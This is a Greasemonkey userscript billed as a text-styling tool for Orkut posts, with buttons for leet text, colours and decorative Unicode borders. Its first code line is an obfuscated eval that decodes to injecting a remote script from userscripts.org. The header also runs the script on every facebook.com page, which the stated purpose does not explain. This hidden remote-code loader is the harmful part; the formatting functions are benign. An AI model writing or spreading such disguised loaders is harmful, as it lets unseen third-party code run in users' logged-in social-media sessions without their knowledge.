// ==UserScript==
// @version 2.2
// @name Stylexx Pro + Last Update
// @include       http*://*.facebook.com/*
// @author DSSR
// @namespace http://www.orkut.com/Profile.aspx?uid=3994617343526165457
// @description Some styles to modify ur text......
// @include http://www.orkut.com/CommMsgPost.aspx?*
// @include http://www.orkut.com/Scrapbook.aspx*
// @include http://www.orkut.com/CommMsgs.aspx?*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


addEventListener('load', function(event) {
function getTextArea() {
	return document.getElementsByTagName('textarea')[0];
}


function mM() {
	e=getTextArea();
	s=e.value;
	r="";
	for(k=0;k<s.length;k++){
		l=s.substr(k,1);
		r+=(k%2) ? l.toLowerCase() : l.toUpperCase();
	}
	e.value=r;
}

//-----------------------------------------------------------
//--                     Code chk                          --
//-----------------------------------------------------------
function chr(){
   s=getTextArea();
   txt=s.value;
var n="";
  n = txt.charCodeAt(0);

   s.value=n;
}

//-----------------------------------------------------------
//--                      lines                            --
//-----------------------------------------------------------
function cerc() {
	v=getTextArea();
	v.value=v.value.replace(/\b/gi,"|");
}

//-----------------------------------------------------------
//--                  Colorful 1                           --
//-----------------------------------------------------------
function colorful() {
	cor=new Array('maroon','red','pink','orange','gold','gray','green','blue','navy');
	var z=0;
	cl=getTextArea();
	cl.value=cl.value.replace(/(.)/gi,"#$1");
	cl.value=cl.value.replace(/\# /gi," ");
	for(y=0;y<cl.value.length;y++){
		cl.value=cl.value.replace(/\#/,'['+cor[z]+']');
		z++;
		if(z==cor.length)
			z=0;
	}
var cd=cl.value;
cl.value="[silver]"+cd+"[/silver]";
}

//-----------------------------------------------------------
//--                     Leet Encryption                   --
//-----------------------------------------------------------
function let() {
   s=getTextArea();
   txt=s.value;
   var crypt = new Array();
   crypt["A"]="4";
   crypt["B"]="8";
   crypt["C"]="(";
   crypt["D"]="|)";
   crypt["E"]="3";
   crypt["F"]="F";
   crypt["G"]="6";
   crypt["H"]="|-|";
   crypt["I"]="1";
   crypt["J"]="J";
   crypt["K"]="|{";
   crypt["L"]="L";
   crypt["M"]="|\/|";
   crypt["N"]="|\|";
   crypt["O"]="()";
   crypt["P"]="P";
   crypt["Q"]="Q";
   crypt["R"]="R";
   crypt["S"]="5";
   crypt["T"]="7";
   crypt["U"]="|_|";
   crypt["V"]="\/";
   crypt["W"]="\/\/";
   crypt["X"]="X";
   crypt["Y"]="Y";
   crypt["Z"]="Z";
   crypt["a"]="4";
   crypt["b"]="8";
   crypt["c"]="(";
   crypt["d"]="d";
   crypt["e"]="3";
   crypt["f"]="f";
   crypt["g"]="6";
   crypt["h"]="h";
   crypt["i"]="1";
   crypt["j"]="j";
   crypt["k"]="k";
   crypt["l"]="|";
   crypt["m"]="m";
   crypt["n"]="n";
   crypt["o"]="0";
   crypt["p"]="p";
   crypt["q"]="q";
   crypt["r"]="r";
   crypt["s"]="5";
   crypt["t"]="7";
   crypt["u"]="u";
   crypt["v"]="v";
   crypt["w"]="w";
   crypt["x"]="x";
   crypt["y"]="y";
   crypt["z"]="z";
   var r="";
   for(x=0;x<txt.length;x++) {
      t=txt.substr(x,1);
      r+= (crypt[t] ? crypt[t] : t);
   }
   s.value=r;
}


//-----------------------------------------------------------
//--                     Leet Decryption                   --
//-----------------------------------------------------------
function leet() {
   s=getTextArea();
   txt=s.value;
   var crypt = new Array();
   crypt["4"]="A";
   crypt["8"]="B";
   crypt["("]="C";
   crypt["|)"]="D";
   crypt["3"]="E";
   crypt["F"]="F";
   crypt["6"]="G";
   crypt["|-|"]="H";
   crypt["1"]="I";
   crypt["J"]="J";
   crypt["|{"]="K";
   crypt["L"]="L";
   crypt["|\/|"]="M";
   crypt["|\|"]="N";
   crypt["()"]="O";
   crypt["P"]="P";
   crypt["Q"]="Q";
   crypt["R"]="R";
   crypt["5"]="S";
   crypt["7"]="T";
   crypt["|_|"]="U";
   crypt["\/"]="V";
   crypt["\/\/"]="W";
   crypt["X"]="X";
   crypt["Y"]="Y";
   crypt["Z"]="Z";
   crypt["4"]="a";
   crypt["8"]="b";
   crypt["("]="c";
   crypt["d"]="d";
   crypt["3"]="e";
   crypt["f"]="f";
   crypt["6"]="g";
   crypt["h"]="h";
   crypt["1"]="i";
   crypt["j"]="j";
   crypt["k"]="k";
   crypt["|"]="l";
   crypt["m"]="m";
   crypt["n"]="n";
   crypt["0"]="o";
   crypt["p"]="p";
   crypt["q"]="q";
   crypt["r"]="r";
   crypt["5"]="s";
   crypt["7"]="t";
   crypt["u"]="u";
   crypt["v"]="v";
   crypt["w"]="w";
   crypt["x"]="x";
   crypt["y"]="y";
   crypt["z"]="z";
   var r="";
   for(x=0;x<txt.length;x++) {
      t=txt.substr(x,1);
      r+= (crypt[t] ? crypt[t] : t);
   }
   s.value=r;
}

//-----------------------------------------------------------
//--                     Style 2                           --
//-----------------------------------------------------------
function stl() {
        f=getTextArea();
	f.value="[b]"+String.fromCharCode(9701)+String.fromCharCode(9699)+String.fromCharCode(9698)+" "+" "+f.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+" "+String.fromCharCode(9699)+String.fromCharCode(9698)+String.fromCharCode(9700);
}


//-----------------------------------------------------------
//--                     Style 3                            --
//-----------------------------------------------------------
function ZPs() {
        n=getTextArea();
	n.value="[b]"+String.fromCharCode(9617)+String.fromCharCode(9733)+String.fromCharCode(9679)+String.fromCharCode(1769)+String.fromCharCode(164)+String.fromCharCode(166)+" "+" "+n.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+" "+String.fromCharCode(166)+String.fromCharCode(164)+String.fromCharCode(1769)+String.fromCharCode(9679)+String.fromCharCode(9733)+String.fromCharCode(9617);
}


//-----------------------------------------------------------
//--                      Style                          --
//-----------------------------------------------------------

function dsr() {
	e=getTextArea();
	e.value="[b]"+"-"+"-"+String.fromCharCode(8249)+String.fromCharCode(166)+"["+String.fromCharCode(8482)+" "+" "+e.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+" "+String.fromCharCode(8482)+"]"+String.fromCharCode(166)+String.fromCharCode(8250)+"-"+"-";
}


//-----------------------------------------------------------
//--                      Style1                          --
//-----------------------------------------------------------

function def() {
	d=getTextArea();
	d.value="[b]"+"-"+"-"+"-"+String.fromCharCode(0xB7)+"("+" "+"-"+String.fromCharCode(0xB7)+"  "+String.fromCharCode(9829)+" "+" "+d.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+" "+String.fromCharCode(9829)+"  "+String.fromCharCode(0xB7)+"-"+")"+String.fromCharCode(0xB7)+"-"+"-"+"-";
}


//-----------------------------------------------------------
//--                      Phi                              --
//-----------------------------------------------------------
function phi() {
	a=getTextArea();
	a.value="[b]"+"("+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(0xD8)+String.fromCharCode(773)+String.fromCharCode(818)+"|"+a.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+"|"+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(0xB6)+String.fromCharCode(773)+String.fromCharCode(818)+")";
}


//-----------------------------------------------------------
//--                      Box                           --
//-----------------------------------------------------------
function box() {
	z=getTextArea();
	z.value="[b]"+"["+z.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+"]";
}


//-----------------------------------------------------------
//--                      Heart                           --
//-----------------------------------------------------------
function hea() {
	y=getTextArea();
	y.value="[b]"+"("+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(9829)+String.fromCharCode(773)+String.fromCharCode(818)+"|"+y.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+"|"+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(9829)+String.fromCharCode(773)+String.fromCharCode(818)+")";
}


//-----------------------------------------------------------
//--                      Bandaid                          --
//-----------------------------------------------------------

function dot() {
	x=getTextArea();
	x.value="[b]"+"("+String.fromCharCode(773)+String.fromCharCode(818)+":"+String.fromCharCode(773)+String.fromCharCode(818)+":"+String.fromCharCode(773)+String.fromCharCode(818)+"|"+x.value.replace(/|/g,String.fromCharCode(773)+String.fromCharCode(818))+"|"+String.fromCharCode(773)+String.fromCharCode(818)+":"+String.fromCharCode(773)+String.fromCharCode(818)+":"+String.fromCharCode(773)+String.fromCharCode(818)+")";
}


//-----------------------------------------------------------
//--                  Written links                        --
//-----------------------------------------------------------
	function dssr() {
	text=getTextArea();
	if (!text) return;
	c=text.parentNode;
	d=document.createElement("div");
	d.className="T";
	d.style.fontSize="11px";
	d.align="left";
	
        d.innerHTML="<b>"+"!!! "+String.fromCharCode(167)+String.fromCharCode(358)+"Y"+"|_"+String.fromCharCode(958)+String.fromCharCode(20034)+String.fromCharCode(20034)+String.fromCharCode(20034)+" !!!</b><br />";
        d.style.marginTop="10px";
	c.appendChild(d);
	
	mm=document.createElement("a");
	mm.href="javascript:;";
	mm.innerHTML="aLtErNaTe";
	mm.addEventListener("click", mM, true);
	d.appendChild(mm);

	SPB=document.createElement("b");
	SPB.innerHTML=" - ";
        d.appendChild(SPB);

	ce=document.createElement("a");
	ce.href="javascript:;";
	ce.innerHTML="|Lines|";
	ce.addEventListener("click", cerc, true);
	d.appendChild(ce);

	SPC=document.createElement("b");
	SPC.innerHTML=" - ";
        d.appendChild(SPC);
	

	color=document.createElement("a");
	color.href="javascript:;";
	color.innerHTML="<span style='color:navy;'>C</span>o<span style='color:red'>l</span>o<span style='color:green'>r</span>f<span style='color:orange'>u</span>l<span style='color:blue'>l</span>";
	color.addEventListener("click", colorful, true);
	d.appendChild(color);
	
	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
	
	s2=document.createElement("a");
	s2.href="javascript:;";
	s2.innerHTML="L337 En";
	s2.addEventListener("click", let, true);
	d.appendChild(s2);
	
	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
	
	he=document.createElement("a");
	he.href="javascript:;";
	he.innerHTML="L337 De";
	he.addEventListener("click", leet, true);
	d.appendChild(he);
	
	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
       
        ss=document.createElement("a");
	ss.href="javascript:;";
	ss.innerHTML=String.fromCharCode(9701)+String.fromCharCode(9699)+String.fromCharCode(9698)+" "+" "+String.fromCharCode(773)+String.fromCharCode(818)+"S"+String.fromCharCode(773)+String.fromCharCode(818)+"T"+String.fromCharCode(773)+String.fromCharCode(818)+"Y"+String.fromCharCode(773)+String.fromCharCode(818)+"L"+String.fromCharCode(773)+String.fromCharCode(818)+"E"+" "+String.fromCharCode(9699)+String.fromCharCode(9698)+String.fromCharCode(9700);
	ss.addEventListener("click", stl, true);
	d.appendChild(ss);

        SPD=document.createElement("b");
	SPD.innerHTML=" - ";
        d.appendChild(SPD);

        s2=document.createElement("a");
	s2.href="javascript:;";
	s2.innerHTML=String.fromCharCode(9617)+String.fromCharCode(9733)+String.fromCharCode(9679)+String.fromCharCode(1769)+String.fromCharCode(164)+String.fromCharCode(166)+"  "+String.fromCharCode(773)+String.fromCharCode(818)+"S"+String.fromCharCode(773)+String.fromCharCode(818)+"T"+String.fromCharCode(773)+String.fromCharCode(818)+"Y"+String.fromCharCode(773)+String.fromCharCode(818)+"L"+String.fromCharCode(773)+String.fromCharCode(818)+"E"+" "+String.fromCharCode(166)+String.fromCharCode(164)+String.fromCharCode(1769)+String.fromCharCode(9679)+String.fromCharCode(9733)+String.fromCharCode(9617);
	s2.addEventListener("click", ZPs, true);
	d.appendChild(s2);

	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
	
	dt=document.createElement("a");
	dt.href="javascript:;";
	dt.innerHTML="-"+"-"+String.fromCharCode(8249)+String.fromCharCode(166)+"["+String.fromCharCode(8482)+" "+String.fromCharCode(773)+String.fromCharCode(818)+"S"+String.fromCharCode(773)+String.fromCharCode(818)+"T"+String.fromCharCode(773)+String.fromCharCode(818)+"Y"+String.fromCharCode(773)+String.fromCharCode(818)+"L"+String.fromCharCode(773)+String.fromCharCode(818)+"E"+" "+String.fromCharCode(8482)+"]"+String.fromCharCode(166)+String.fromCharCode(8250)+"-"+"-";
	dt.addEventListener("click", dsr, true);
	d.appendChild(dt);
        
        SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
        
        ph=document.createElement("a");
	ph.href="javascript:;";
	ph.innerHTML="("+String.fromCharCode(0xD8)+String.fromCharCode(773)+String.fromCharCode(818)+"S"+String.fromCharCode(773)+String.fromCharCode(818)+"T"+String.fromCharCode(773)+String.fromCharCode(818)+"Y"+String.fromCharCode(773)+String.fromCharCode(818)+"L"+String.fromCharCode(773)+String.fromCharCode(818)+"E"+String.fromCharCode(0xB6)+String.fromCharCode(773)+String.fromCharCode(818)+")";
	ph.addEventListener("click", phi, true);
	d.appendChild(ph);
        
        SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
        
        st=document.createElement("a");
	st.href="javascript:;";
	st.innerHTML="-"+"-"+"-"+String.fromCharCode(0xB7)+"("+" "+"-"+String.fromCharCode(0xB7)+"  "+String.fromCharCode(9829)+" "+" "+String.fromCharCode(773)+String.fromCharCode(818)+"S"+String.fromCharCode(773)+String.fromCharCode(818)+"T"+String.fromCharCode(773)+String.fromCharCode(818)+"Y"+String.fromCharCode(773)+String.fromCharCode(818)+"L"+String.fromCharCode(773)+String.fromCharCode(818)+"E"+" "+String.fromCharCode(9829)+"  "+String.fromCharCode(0xB7)+"-"+")"+String.fromCharCode(0xB7)+"-"+"-"+"-";
	st.addEventListener("click", def, true);
	d.appendChild(st);
        
        SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);

        bo=document.createElement("a");
	bo.href="javascript:;";
	bo.innerHTML="["+String.fromCharCode(773)+String.fromCharCode(818)+"B"+String.fromCharCode(773)+String.fromCharCode(818)+"o"+String.fromCharCode(773)+String.fromCharCode(818)+"x"+String.fromCharCode(773)+String.fromCharCode(818)+"]";
	bo.addEventListener("click", box, true);
	d.appendChild(bo);
	
	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
	
	he=document.createElement("a");
	he.href="javascript:;";
	he.innerHTML="("+String.fromCharCode(9829)+String.fromCharCode(773)+String.fromCharCode(818)+"H"+String.fromCharCode(773)+String.fromCharCode(818)+"e"+String.fromCharCode(773)+String.fromCharCode(818)+"a"+String.fromCharCode(773)+String.fromCharCode(818)+"r"+String.fromCharCode(773)+String.fromCharCode(818)+"t"+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(9829)+")";
	he.addEventListener("click", hea, true);
	d.appendChild(he);
	
	SPE=document.createElement("b");
	SPE.innerHTML=" - ";
        d.appendChild(SPE);
	
	dt=document.createElement("a");
	dt.href="javascript:;";
	dt.innerHTML="("+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(58)+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(58)+String.fromCharCode(773)+String.fromCharCode(818)+"B"+String.fromCharCode(773)+String.fromCharCode(818)+"a"+String.fromCharCode(773)+String.fromCharCode(818)+"n"+String.fromCharCode(773)+String.fromCharCode(818)+"d"+String.fromCharCode(773)+String.fromCharCode(818)+"-"+String.fromCharCode(773)+String.fromCharCode(818)+"A"+String.fromCharCode(773)+String.fromCharCode(818)+"i"+String.fromCharCode(773)+String.fromCharCode(818)+"d"+String.fromCharCode(58)+String.fromCharCode(773)+String.fromCharCode(818)+String.fromCharCode(58)+String.fromCharCode(773)+String.fromCharCode(818)+")";
	dt.addEventListener("click", dot, true);
	d.appendChild(dt);

        
}

dssr();
}, false);